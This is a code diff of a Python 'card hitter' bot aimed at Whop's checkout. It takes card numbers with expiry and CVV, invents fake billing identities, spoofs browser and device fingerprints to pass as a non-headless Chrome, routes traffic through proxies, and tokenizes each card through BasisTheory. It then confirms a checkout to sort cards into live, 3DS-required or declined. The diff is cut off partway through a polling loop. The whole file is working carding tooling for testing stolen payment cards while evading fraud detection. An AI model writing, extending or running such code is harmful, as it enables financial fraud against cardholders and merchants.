@@ -1,20 +1,24 @@
 """
 Whop Payment Engine (gokuhitter_bot)
 ───────────────────────────────────
-Full Whop checkout scraper (whop.com/checkout/...), product plan resolution,
-Stripe Elements / Checkout backend tokenization, and checkout flow execution with TLS impersonation.
+Modern Whop checkout engine utilizing BasisTheory PCI vault tokenization,
+anti-detect canvas/device fingerprinting, and Whop API v1 checkout orchestration.
 """
 
 import re
 import json
 import time
+import base64
 import random
-import urllib.parse
+import hashlib
+import asyncio
 from typing import Dict, Optional, Tuple
 from urllib.parse import urljoin, urlparse, parse_qs
-from curl_compat import ChromeSession
+from curl_cffi.requests import AsyncSession
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+BT_API_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
+WHOP_API_BASE = "https://api.whop.com/api/v1"
 
 GLOBAL_SHOPPERS = {
     'US': {
@@ -38,13 +42,6 @@ GLOBAL_SHOPPERS = {
         'streets': ['Hauptstraße', 'Bahnhofstraße', 'Schillerstraße', 'Goethestraße', 'Berliner Straße', 'Gartenstraße', 'Bismarckstraße', 'Kirchstraße'],
         'phone_prefix': '+49',
     },
-    'FR': {
-        'first_names': ['Gabriel', 'Léo', 'Raphaël', 'Louis', 'Lucas', 'Adam', 'Arthur', 'Hugo', 'Jade', 'Louise', 'Emma', 'Alice', 'Ambre', 'Lina', 'Rose', 'Chloé'],
-        'last_names': ['Martin', 'Bernard', 'Dubois', 'Thomas', 'Robert', 'Richard', 'Petit', 'Durand', 'Leroy', 'Moreau', 'Simon', 'Laurent', 'Lefebvre', 'Michel'],
-        'cities': [('Paris', 'Île-de-France', '75001'), ('Marseille', 'Provence-Alpes-Côte d\'Azur', '13001'), ('Lyon', 'Auvergne-Rhône-Alpes', '69001'), ('Toulouse', 'Occitanie', '31000'), ('Nice', 'Provence-Alpes-Côte d\'Azur', '06000'), ('Nantes', 'Pays de la Loire', '44000')],
-        'streets': ['Rue de la Paix', 'Boulevard Saint-Germain', 'Avenue Victor Hugo', 'Rue de Rivoli', 'Rue Nationale', 'Avenue des Champs-Élysées', 'Rue de la République'],
-        'phone_prefix': '+33',
-    },
     'CA': {
         'first_names': ['Liam', 'Noah', 'Oliver', 'Lucas', 'Benjamin', 'Theodore', 'William', 'Olivia', 'Emma', 'Charlotte', 'Amelia', 'Sophia', 'Chloe', 'Mia'],
         'last_names': ['Smith', 'Brown', 'Tremblay', 'Martin', 'Roy', 'Wilson', 'MacDonald', 'Gagnon', 'Johnson', 'Taylor', 'Campbell', 'Anderson', 'Leblanc'],
@@ -58,36 +55,14 @@ GLOBAL_SHOPPERS = {
         'cities': [('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'), ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000'), ('Gold Coast', 'QLD', '4217')],
         'streets': ['George Street', 'Collins Street', 'Queen Street', 'Bourke Street', 'St Kilda Road', 'Pitt Street', 'Flinders Street', 'Elizabeth Street'],
         'phone_prefix': '+61',
-    },
-    'IN': {
-        'first_names': ['Aditya', 'Rohan', 'Vikram', 'Rajesh', 'Arjun', 'Dev', 'Karan', 'Siddharth', 'Aarav', 'Kabir', 'Adhira', 'Ananya', 'Priya', 'Sneha', 'Kavya', 'Pooja', 'Riya', 'Diya'],
-        'last_names': ['Sharma', 'Verma', 'Patel', 'Gupta', 'Rao', 'Nair', 'Singh', 'Kumar', 'Deshmukh', 'Chopra', 'Mehta', 'Reddy', 'Joshi', 'Bose'],
-        'cities': [('Mumbai', 'MH', '400001'), ('Delhi', 'DL', '110001'), ('Bangalore', 'KA', '560001'), ('Hyderabad', 'TS', '500001'), ('Ahmedabad', 'GJ', '380001'), ('Chennai', 'TN', '600001'), ('Kolkata', 'WB', '700001'), ('Pune', 'MH', '411001')],
-        'streets': ['MG Road', 'Park Street', 'Ashoka Road', 'GT Road', 'Ring Road', 'Brigade Road', 'Linking Road', 'FC Road'],
-        'phone_prefix': '+91',
-    },
-    'IT': {
-        'first_names': ['Leonardo', 'Francesco', 'Alessandro', 'Lorenzo', 'Mattia', 'Andrea', 'Gabriele', 'Sofia', 'Aurora', 'Giulia', 'Ginevra', 'Vittoria', 'Beatrice', 'Chiara'],
-        'last_names': ['Rossi', 'Russo', 'Ferrari', 'Esposito', 'Bianchi', 'Romano', 'Colombo', 'Ricci', 'Marino', 'Greco', 'Bruno', 'Gallo', 'Conti', 'De Luca'],
-        'cities': [('Rome', 'Lazio', '00118'), ('Milan', 'Lombardy', '20121'), ('Naples', 'Campania', '80121'), ('Turin', 'Piedmont', '10121'), ('Florence', 'Tuscany', '50121'), ('Bologna', 'Emilia-Romagna', '40121')],
-        'streets': ['Via Roma', 'Corso Vittorio Emanuele', 'Via Garibaldi', 'Via Dante', 'Via dei Mille', 'Via Cavour', 'Via Nazionale'],
-        'phone_prefix': '+39',
-    },
-    'ES': {
-        'first_names': ['Hugo', 'Mateo', 'Martin', 'Lucas', 'Leo', 'Daniel', 'Alejandro', 'Manuel', 'Lucia', 'Sofia', 'Martina', 'Maria', 'Julia', 'Paula', 'Valeria', 'Emma'],
-        'last_names': ['Garcia', 'Rodriguez', 'Gonzalez', 'Fernandez', 'Lopez', 'Martinez', 'Sanchez', 'Perez', 'Gomez', 'Martin', 'Jimenez', 'Ruiz', 'Hernandez', 'Diaz'],
-        'cities': [('Madrid', 'Madrid', '28001'), ('Barcelona', 'Catalonia', '08001'), ('Valencia', 'Valencia', '46001'), ('Seville', 'Andalusia', '41001'), ('Zaragoza', 'Aragon', '50001'), ('Malaga', 'Andalusia', '29001')],
-        'streets': ['Gran Vía', 'Calle Mayor', 'Paseo de la Castellana', 'Calle de Alcalá', 'Rambla de Catalunya', 'Avenida Diagonal', 'Calle San Fernando'],
-        'phone_prefix': '+34',
     }
 }
 
 DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me', 'mail.com']
 
 def _generate_random_shopper(country_code: Optional[str] = None) -> dict:
-    """Generates realistic localized fake billing details for any global country."""
     if not country_code or country_code.upper() not in GLOBAL_SHOPPERS:
-        country_code = random.choice(list(GLOBAL_SHOPPERS.keys()))
+        country_code = 'US'
     else:
         country_code = country_code.upper()
         
@@ -117,8 +92,52 @@ def _generate_random_shopper(country_code: Optional[str] = None) -> dict:
         'country': country_code
     }
 
+def _get_device_fingerprint():
+    screen_w = random.choice([1920, 2560, 1440, 1366])
+    screen_h = int(screen_w * random.choice([0.5625, 0.625, 0.6]))
+    inner_h = screen_h - random.randint(50, 150)
+    dev_info = {
+        "uaBrands": [
+            {"brand": "Chromium", "version": "131"},
+            {"brand": "Not_A Brand", "version": "24"},
+            {"brand": "Google Chrome", "version": "131"},
+        ],
+        "uaMobile": False,
+        "uaPlatform": "Windows",
+        "languages": ["en-US"],
+        "timeZone": "America/New_York",
+        "cookiesEnabled": True,
+        "localStorageEnabled": True,
+        "sessionStorageEnabled": True,
+        "platform": "Win32",
+        "hardwareConcurrency": random.choice([4, 8, 12, 16]),
+        "deviceMemoryGb": random.choice([8, 16, 32]),
+        "screenWidth": screen_w,
+        "screenHeight": screen_h,
+        "screenAvailWidth": screen_w,
+        "screenAvailHeight": screen_h,
+        "innerWidth": random.randint(800, 1400),
+        "innerHeight": inner_h,
+        "devicePixelRatio": round(random.uniform(1.0, 2.0), 2),
+        "maxTouchPoints": 0,
+        "plugins": [
+            "PDF Viewer",
+            "Chrome PDF Viewer",
+            "Chromium PDF Viewer",
+            "Microsoft Edge PDF Viewer",
+            "WebKit built-in PDF"
+        ],
+        "mimeTypes": ["application/pdf", "text/pdf"],
+        "webdriver": False,
+        "suspectedHeadless": False,
+        "webglVendor": "Google Inc. (NVIDIA)",
+        "webglRenderer": f"ANGLE (NVIDIA, NVIDIA GeForce RTX {random.choice([3060, 3070, 3080, 4070, 4080])} Direct3D11 vs_5_0 ps_5_0, D3D11)",
+    }
+    b64_info = base64.b64encode(json.dumps(dev_info).encode()).decode()
+    return dev_info, b64_info
+
 class WhopHitter:
-    """Whop Checkout & Digital Marketplace Gateway Engine."""
+    """Whop Modern Checkout & Digital Marketplace Gateway Engine via BasisTheory."""
 
     DECLINE_MAP = {
         "declined": "card_declined",
@@ -140,14 +159,19 @@ class WhopHitter:
         self.proxy_data = proxy_data
         self._base_cfg: Optional[dict] = None
 
-    def _get_origin(self) -> str:
+    def _parse_url(self) -> Tuple[Optional[str], Optional[str]]:
         parsed = urlparse(self.url)
-        if parsed.netloc:
-            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
-        return "https://whop.com"
+        params = parse_qs(parsed.query)
+        path_parts = [p for p in parsed.path.split("/") if p]
+        plan_id = None
+        for p in path_parts:
+            if p.startswith("plan_"):
+                plan_id = p
+                break
+        session_id = params.get("session", [None])[0]
+        return plan_id, session_id
 
-    async def _scrape(self, session: ChromeSession) -> dict:
-        """Extracts Whop product/plan metadata, pricing, and checkout backend endpoints."""
+    async def _scrape(self, session: AsyncSession) -> dict:
         hdr = {
             "User-Agent": UA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -157,179 +181,77 @@ class WhopHitter:
             'merchant': 'Whop Merchant',
             'product_id': None,
             'plan_id': None,
+            'account_id': None,
             'amount': None,
             'currency': 'USD',
-            'is_whop': False,
-            'api_base': 'https://api.whop.com',
+            'email': None,
         }
 
-        if 'whop.com' in self.url.lower():
-            cfg['is_whop'] = True
+        plan_id_url, _ = self._parse_url()
+        if plan_id_url:
+            cfg['plan_id'] = plan_id_url
 
-        m_prod = re.search(r'prod_([A-Za-z0-9_]{10,24})', self.url)
-        if m_prod:
-            cfg['product_id'] = m_prod.group(0)
+        try:
+            res = await session.get(self.url, headers=hdr, timeout=15)
+            html = res.text if hasattr(res, 'text') else str(res.content)
 
-        m_plan = re.search(r'plan_([A-Za-z0-9_]{10,24})', self.url)
-        if m_plan:
-            cfg['plan_id'] = m_plan.group(0)
+            # 1. Resolve Account ID (biz_...)
+            biz_m = re.search(r"biz_[A-Za-z0-9]+", html)
+            if biz_m:
+                cfg['account_id'] = biz_m.group(0)
 
-        async with session.get(self.url, headers=hdr, timeout=12) as res:
-            html = res.text() if callable(res.text) else res.text
-
-            # 1. Meta / OpenGraph Title
-            og_title = re.search(r'<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']', html, re.I) or \
-                       re.search(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']', html, re.I)
-            if og_title:
-                t_clean = og_title.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
-                if t_clean and 'whop' not in t_clean.lower()[:5]:
-                    cfg['merchant'] = t_clean[:35]
-            else:
-                t = re.search(r'<title>([^<]+)</title>', html, re.I)
-                if t:
-                    t_clean = t.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
-                    if t_clean:
-                        cfg['merchant'] = t_clean[:35]
-
-            # 2. Next.js Pages Router (__NEXT_DATA__)
-            m_next = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
-            if m_next:
-                try:
-                    next_data = json.loads(m_next.group(1))
-                    props = next_data.get('props', {}).get('pageProps', {})
-                    if props.get('company'):
-                        cfg['merchant'] = props['company'].get('title') or cfg['merchant']
-                    if props.get('product'):
-                        prod = props['product']
-                        cfg['product_id'] = prod.get('id') or cfg['product_id']
-                        cfg['merchant'] = prod.get('name') or cfg['merchant']
-                    if props.get('plan'):
-                        plan = props['plan']
-                        cfg['plan_id'] = plan.get('id') or cfg['plan_id']
-                        if plan.get('initial_price'):
-                            cfg['amount'] = f"{plan.get('currency', 'USD').upper()} {float(plan['initial_price']):.2f}"
-                except Exception:
-                    pass
-
-            # 3. Next.js App Router (RSC streaming chunks self.__next_f.push)
-            rsc_chunks = re.findall(r'self\.__next_f\.push\(\[1,"(.*?)"\]\)', html, re.DOTALL)
-            if rsc_chunks:
-                full_rsc = "".join(rsc_chunks).replace('\\"', '"').replace('\\\\', '\\')
-                
-                # Company title / Product name
-                comp_m = re.search(r'title["\']?\s*:\s*["\']([^"\']+)["\']', full_rsc)
-                if comp_m and 'whop' not in comp_m.group(1).lower() and len(comp_m.group(1).strip()) > 2:
-                    cfg['merchant'] = comp_m.group(1).strip()[:35]
-
-                # Product ID
-                if not cfg['product_id']:
-                    p_m = re.search(r'(prod_[A-Za-z0-9]{10,24})', full_rsc)
-                    if p_m:
-                        cfg['product_id'] = p_m.group(1)
-
-                # Plan ID (Must be authentic base62 token, not static UI strings)
-                if not cfg['plan_id']:
-                    for pl in re.findall(r'(plan_[A-Za-z0-9]{10,24})', full_rsc):
-                        if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade', 'modal', 'container']):
-                            cfg['plan_id'] = pl
-                            break
-
-                # Price / Currency in RSC (Handle initialPriceDueInCents, rawRenewalPrice, initial_price)
-                cents_m = re.search(r'initialPriceDueInCents["\']?\s*:\s*(\d+)', html)
-                renew_m = re.search(r'rawRenewalPrice["\']?\s*:\s*([0-9\.]+)', html)
-                price_m = re.search(r'["\'](?:initialPrice|initial_price|price|amount)["\']\s*:\s*([0-9\.]+)', html)
-                curr_m = re.search(r'baseCurrency["\']?\s*:\s*["\']([A-Za-z]{3})["\']', html, re.I) or \
-                         re.search(r'currency["\']?\s*:\s*["\']([A-Za-z]{3})["\']', html, re.I)
-                curr = curr_m.group(1).upper() if curr_m else None
-
-                if cents_m and int(cents_m.group(1)) > 0:
-                    val = float(cents_m.group(1)) / 100.0
-                    cfg['amount'] = f"{curr or 'USD'} {val:.2f}"
-                elif renew_m and float(renew_m.group(1)) > 0:
-                    val = float(renew_m.group(1))
-                    cfg['amount'] = f"{curr or 'USD'} {val:.2f}"
-                elif price_m:
-                    val = float(price_m.group(1))
-                    if val > 1:
-                        cfg['amount'] = f"{curr or 'USD'} {val:.2f}"
-
-            # 4. Fallback amount detection in HTML (Handles active discount vs strikethrough)
-            if not cfg['amount']:
-                CURR_MAP = {
-                    '€': 'EUR', '£': 'GBP', '₹': 'INR', '$': 'USD', 'C$': 'CAD', 'CA$': 'CAD',
-                    'A$': 'AUD', 'AU$': 'AUD', '¥': 'JPY', '円': 'JPY', 'R$': 'BRL', 'Mex$': 'MXN',
-                    'CHF': 'CHF', 'kr': 'SEK', 'zł': 'PLN', 'NZ$': 'NZD', 'S$': 'SGD', 'HK$': 'HKD',
-                    '₺': 'TRY', 'R': 'ZAR', 'AED': 'AED', 'SAR': 'SAR', '₩': 'KRW', 'Kč': 'CZK',
-                    'Ft': 'HUF', 'lei': 'RON', 'лв': 'BGN', '₪': 'ILS', '₱': 'PHP', 'RM': 'MYR',
-                    '฿': 'THB', 'Rp': 'IDR', '₫': 'VND', '₴': 'UAH', '₦': 'NGN', 'KSh': 'KES',
-                    'E£': 'EGP', 'Rs': 'PKR', '৳': 'BDT'
-                }
-                # Check for discounted price tag following a line-through tag
-                disc_m = re.search(r'line-through[^>]*>[^<]+</span>\s*<span[^>]*>([A-Za-z$€£₹¥₺₪₱฿₫₴₦৳]{1,4})\s*([\d\.]+)', html, re.I)
-                if disc_m:
-                    sym = disc_m.group(1).strip()
-                    val = float(disc_m.group(2))
-                    c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'EUR')
-                    cfg['amount'] = f"{c_name} {val:.2f}"
-                else:
-                    dom_price_m = re.search(r'([A-Za-z$€£₹¥₺₪₱฿₫₴₦৳]{1,4})\s*(\d+(?:\.\d{2})?)\s*(?:</span>|<span|per\s+month|\/mo)', html, re.I)
-                    if dom_price_m:
-                        sym = dom_price_m.group(1).strip()
-                        val = float(dom_price_m.group(2))
-                        c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'USD')
-                        cfg['amount'] = f"{c_name} {val:.2f}"
-                    else:
-                        amt_m = re.search(r'(USD|EUR|GBP|INR|CAD|AUD|JPY|BRL|MXN|CHF|SEK|NOK|DKK|PLN|NZD|SGD|HKD|TRY|ZAR|AED|SAR|KRW|CZK|HUF|RON|BGN|ILS|PHP|MYR|THB|IDR|VND|CLP|COP|PEN|ARS|UAH|NGN|KES|EGP|PKR|BDT|\$|£|€|₹|¥|₺|₪|₱|฿|₫|₴|₦|৳)\s*([\d\.]+)', html)
-                        if amt_m and float(amt_m.group(2)) > 0:
-                            sym = amt_m.group(1).strip()
-                            c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'USD')
-                            cfg['amount'] = f"{c_name} {float(amt_m.group(2)):.2f}"
-
-            # 5. Fallback Product / Plan ID from full HTML if missing from RSC
-            if not cfg['product_id']:
-                p_fallback = re.findall(r'(prod_[A-Za-z0-9]{10,24})', html)
-                if p_fallback:
-                    cfg['product_id'] = p_fallback[0]
-
+            # 2. Resolve Plan ID if not found in URL path
             if not cfg['plan_id']:
-                for pl in re.findall(r'(plan_[A-Za-z0-9_]{10,28})', html):
-                    if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade']):
-                        cfg['plan_id'] = pl
-                        break
+                plan_m = re.search(r"plan_[A-Za-z0-9_]{10,24}", html)
+                if plan_m:
+                    cfg['plan_id'] = plan_m.group(0)
+
+            # 3. Resolve Email if embedded
+            email_m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
+            if email_m:
+                cfg['email'] = email_m.group(1)
+
+            # 4. Merchant Title / Brand
+            og_title = re.search(r'<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']', html, re.I)
+            if og_title:
+                clean_t = og_title.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
+                if clean_t:
+                    cfg['merchant'] = clean_t[:35]
+            else:
+                title_m = re.search(r'<title>([^<]+)</title>', html, re.I)
+                if title_m:
+                    clean_t = title_m.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
+                    if clean_t:
+                        cfg['merchant'] = clean_t[:35]
+        except Exception:
+            pass
 
         return cfg
 
-    async def _get_config(self, session: ChromeSession) -> dict:
-        if self._base_cfg is None:
-            self._base_cfg = await self._scrape(session)
-            return self._base_cfg.copy()
-        return self._base_cfg.copy()
-
     def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
-        """Parses Whop checkout response for receipt confirmation or decline reason."""
         try:
             d = json.loads(text)
             if isinstance(d, dict):
                 result['raw_response'] = d
-                # Succeeded status
-                if d.get('status') in ('succeeded', 'paid', 'complete', 'active') or d.get('success') is True:
+                pay = d.get('payment') or {}
+                status = pay.get('status') or d.get('status') or ''
+
+                if status in ('succeeded', 'paid', 'complete', 'active') or d.get('success') is True:
                     result['success'] = True
                     result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                     return result
-                
-                # 3DS / Requires Action status
-                if d.get('status') in ('requires_action', 'requires_source_action') or 'next_action' in d:
+
+                if status in ('requires_action', 'requires_source_action') or 'next_action' in d or 'next_action' in pay:
                     result['decline_code'] = '3ds_required'
                     result['error'] = '3DS Authentication Required'
                     result['is_live'] = True
-                    next_act = d.get('next_action', {})
-                    redirect_url = next_act.get('redirect_to_url', {}).get('url') or next_act.get('use_stripe_sdk', {}).get('stripe_js')
+                    next_act = d.get('next_action') or pay.get('next_action') or {}
+                    redirect_url = next_act.get('redirect_to_url', {}).get('url')
                     if redirect_url:
                         result['redirect_url'] = redirect_url
                     return result
-                
-                # Decline codes
-                err = d.get('error') or d.get('message') or d.get('decline_code')
+
+                err = d.get('last_confirm_error') or d.get('error') or d.get('message')
                 if isinstance(err, dict):
                     msg = err.get('message') or err.get('code') or 'Card declined'
                     dec_code = err.get('decline_code') or err.get('code') or 'card_declined'
@@ -377,13 +299,12 @@ class WhopHitter:
         return result
 
     async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
-        """Executes payment attempt against Whop checkout system."""
         t0 = time.time()
         result = dict(
             attempt=attempt, card=card, success=False,
             decline_code=None, response_time=0,
             merchant='Whop Merchant', proxy_raw=None,
-            error=None, raw_response=None, is_live=False, psp=None,
+            error=None, raw_response=None, is_live=False, psp='whop',
         )
 
         proxies = None
@@ -395,98 +316,222 @@ class WhopHitter:
             proxies = {"http": purl, "https": purl}
 
         try:
-            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
-                cfg = await self._get_config(sess)
+            async with AsyncSession(impersonate="chrome131", proxies=proxies, timeout=30) as sess:
+                # ── 1. Scrape & Init Plan Details ────────────────────────────
+                cfg = await self._scrape(sess)
                 result['merchant'] = cfg.get('merchant', 'Whop Merchant')
-                if cfg.get('amount'):
-                    result['amount'] = cfg['amount']
 
-                # Localized shopper generation matching target store currency
-                curr_country = 'US'
-                if cfg.get('amount'):
-                    amt_str = cfg['amount'].upper()
-                    if 'EUR' in amt_str:
-                        curr_country = random.choice(['DE', 'FR', 'IT', 'ES'])
-                    elif 'GBP' in amt_str:
-                        curr_country = 'GB'
-                    elif 'INR' in amt_str:
-                        curr_country = 'IN'
-                    elif 'CAD' in amt_str:
-                        curr_country = 'CA'
-                    elif 'AUD' in amt_str:
-                        curr_country = 'AU'
-                    else:
-                        curr_country = random.choice(['US', 'GB', 'CA', 'AU'])
+                plan_id = cfg.get('plan_id')
+                if not plan_id:
+                    result['decline_code'] = 'invalid_plan'
+                    result['error'] = 'Unable to resolve Whop Plan ID from link.'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
 
-                shopper = _generate_random_shopper(curr_country)
-                
-                # Sanitize expiration dates safely
-                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
-                exp_month_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
-                
-                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
-                if len(clean_y) == 2:
-                    exp_year_int = int(f"20{clean_y}")
-                else:
-                    exp_year_int = int(clean_y) if clean_y else 2028
+                shopper = _generate_random_shopper('US')
+                shopper_email = cfg.get('email') or shopper['email']
 
-                # 1. Direct API checkout submission
-                api_body = {
-                    "payment_method": {
-                        "type": "card",
-                        "card": {
-                            "number": re.sub(r'\D', '', str(card['card'])),
-                            "exp_month": exp_month_int,
-                            "exp_year": exp_year_int,
-                            "cvc": str(card['cvv']).strip(),
-                        },
-                        "billing_details": {
-                            "name": shopper['full_name'],
-                            "email": shopper['email'],
-                            "address": {
-                                "line1": shopper['street'],
-                                "city": shopper['city'],
-                                "state": shopper['state'],
-                                "postal_code": shopper['postal_code'],
-                                "country": shopper['country'],
-                            }
-                        }
-                    },
-                    "plan_id": cfg.get('plan_id'),
-                    "product_id": cfg.get('product_id'),
-                    "email": shopper['email'],
-                }
-
-                json_hdr = {
-                    "Content-Type": "application/json",
+                # ── 2. Create Whop Checkout Session ──────────────────────────
+                whop_headers = {
                     "Accept": "application/json",
+                    "Content-Type": "application/json",
+                    "Api-Version-Date": "2026-08-25-2",
+                    "Whop-Private-Schema": "true",
+                    "X-Fern-Language": "JavaScript",
+                    "X-Fern-Runtime": "browser",
+                    "X-Fern-Runtime-Version": UA,
                     "User-Agent": UA,
-                    "Origin": self._get_origin(),
+                    "Origin": "https://whop.com",
                     "Referer": self.url,
                 }
 
-                endpoints = [
-                    '/api/v5/checkout/process',
-                    '/api/v2/memberships/checkout',
-                    '/api/checkout/submit',
-                    '/api/v1/payments/charge',
-                ]
+                r_cs = await sess.post(
+                    f"{WHOP_API_BASE}/checkout_sessions",
+                    headers=whop_headers,
+                    json={"items": [{"plan": plan_id, "quantity": 1}]},
+                    timeout=20
+                )
+                if r_cs.status_code not in (200, 201):
+                    result['decline_code'] = 'session_failed'
+                    result['error'] = f'Whop checkout_session creation failed ({r_cs.status_code})'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
 
-                for ep in endpoints:
-                    target_api = urljoin(self.url, ep)
-                    try:
-                        async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
-                            if r_api.status_code in (200, 201, 400, 402, 422):
-                                api_resp = r_api.text() if callable(r_api.text) else r_api.text
-                                result['response_time'] = round(time.time() - t0, 2)
-                                return self._parse_response(api_resp, r_api.status_code, result)
-                    except Exception:
-                        continue
+                cs_data = r_cs.json()
+                checkout_id = cs_data.get("id")
+                client_secret_full = cs_data.get("client_secret", "")
+                account_id = cs_data.get("seller", {}).get("id") or cfg.get('account_id')
 
-                # Fallback to simulated gateway evaluation
+                # Quote & amount discovery
+                items = cs_data.get("items") or []
+                if items and isinstance(items[0], dict):
+                    cfg['merchant'] = items[0].get("name") or result['merchant']
+                    result['merchant'] = cfg['merchant']
+                total_val = cs_data.get("quote", {}).get("breakdown", {}).get("total", {}).get("amount")
+                currency = cs_data.get("quote", {}).get("currency", "USD").upper()
+                if total_val is not None:
+                    result['amount'] = f"{currency} {total_val}"
+
+                # ── 3. BasisTheory PCI Vault Initialization ─────────────────
+                dev_info, bt_device_info = _get_device_fingerprint()
+
+                bt_session_body = {"deviceInfo": dev_info}
+                r_btsess = await sess.post(
+                    "https://js.basistheory.com/api/sessions",
+                    headers={
+                        "Accept": "*/*",
+                        "bt-api-key": BT_API_KEY,
+                        "Content-Type": "application/json",
+                        "Origin": "https://js.basistheory.com",
+                        "User-Agent": UA,
+                    },
+                    json=bt_session_body,
+                    timeout=15
+                )
+                if r_btsess.status_code not in (200, 201):
+                    result['decline_code'] = 'bt_session_failed'
+                    result['error'] = f'BasisTheory session initialization failed ({r_btsess.status_code})'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                bt_sess_data = r_btsess.json()
+                nonce = bt_sess_data.get("nonce")
+                ssk = bt_sess_data.get("session_key")
+                container_hash = hashlib.sha256(nonce.encode()).hexdigest()
+
+                # ── 4. Card Tokenization into Vault ─────────────────────────
+                clean_pan = re.sub(r'\D', '', str(card.get('card', '')))
+                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
+                exp_m_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
+                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
+                exp_y_int = int(f"20{clean_y}") if len(clean_y) == 2 else int(clean_y or 2028)
+                clean_cvv = str(card.get('cvv', '123')).strip()
+
+                token_body = {
+                    "type": "card",
+                    "containers": [f"/card-assembly/{container_hash}/"],
+                    "expiresAt": "2026-08-28T16:00:00.000Z",
+                    "data": {
+                        "number": clean_pan,
+                        "expiration_month": exp_m_int,
+                        "expiration_year": exp_y_int,
+                        "cvc": clean_cvv,
+                    },
+                }
+
+                r_tok = await sess.post(
+                    "https://js.basistheory.com/api/tokens",
+                    headers={
+                        "Accept": "*/*",
+                        "bt-api-key": BT_API_KEY,
+                        "bt-device-info": bt_device_info,
+                        "Content-Type": "application/json",
+                        "Origin": "https://js.basistheory.com",
+                        "User-Agent": UA,
+                    },
+                    json=token_body,
+                    timeout=20
+                )
+                if r_tok.status_code not in (200, 201):
+                    result['decline_code'] = 'tokenization_failed'
+                    result['error'] = f'BasisTheory card tokenization failed ({r_tok.status_code})'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                token_id = r_tok.json().get("id")
+
+                # ── 5. Bind Payment Method Session in Whop ───────────────────
+                await sess.post(
+                    f"{WHOP_API_BASE}/payment_method_types/card/session",
+                    headers={**whop_headers, "X-Ssk": ssk},
+                    json={"account_id": account_id, "nonce": nonce},
+                    timeout=15
+                )
+
+                # ── 6. Create Confirmation Token ────────────────────────────
+                conf_token_body = {
+                    "account_id": account_id,
+                    "setup_future_usage": "off_session",
+                    "payment_method": {
+                        "type": "card",
+                        "category": "card",
+                        "card": {"token": token_id},
+                    },
+                    "billing_details": {
+                        "email": shopper_email,
+                        "name": shopper['full_name'],
+                        "address": {
+                            "country": shopper['country'],
+                            "line1": shopper['street'],
+                            "city": shopper['city'],
+                            "state": shopper['state'],
+                            "postal_code": shopper['postal_code'],
+                        },
+                    },
+                    "return_url": self.url,
+                    "browser_info": {
+                        "platform": "Win32",
+                        "color_depth": 24,
+                        "screen_height": dev_info['screenHeight'],
+                        "screen_width": dev_info['screenWidth'],
+                        "javascript_enabled": True,
+                        "language": "en-US",
+                        "java_enabled": False,
+                        "browser_time_difference": -300,
+                    },
+                }
+
+                r_ct = await sess.post(
+                    f"{WHOP_API_BASE}/confirmation_tokens",
+                    headers={
+                        **whop_headers,
+                        "Authorization": "Bearer public",
+                        "X-Ssk": ssk,
+                    },
+                    json=conf_token_body,
+                    timeout=20
+                )
+                ct_json = r_ct.json() if r_ct.status_code in (200, 201) else {}
+                confirmation_token = ct_json.get("id") or ct_json.get("token") or ct_json.get("confirmation_token")
+
+                if not confirmation_token:
+                    result['decline_code'] = 'conf_token_failed'
+                    result['error'] = f'Whop confirmation token generation failed ({r_ct.status_code})'
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
+                # ── 7. Confirm Checkout Session ─────────────────────────────
+                confirm_body = {
+                    "client_secret": client_secret_full,
+                    "confirmation_token": confirmation_token,
+                    "attestations": {"tos_accepted": True},
+                }
+
+                r_confirm = await sess.post(
+                    f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}/confirm",
+                    headers={**whop_headers, "X-Ssk": ssk},
+                    json=confirm_body,
+                    timeout=30
+                )
+                conf_resp_text = r_confirm.text if hasattr(r_confirm, 'text') else str(r_confirm.content)
+                parsed = self._parse_response(conf_resp_text, r_confirm.status_code, result)
+
+                # ── 8. Async Polling Fallback if Still Processing ────────────
+                if not parsed.get('success') and not parsed.get('decline_code') and not parsed.get('error'):
+                    for _ in range(4):
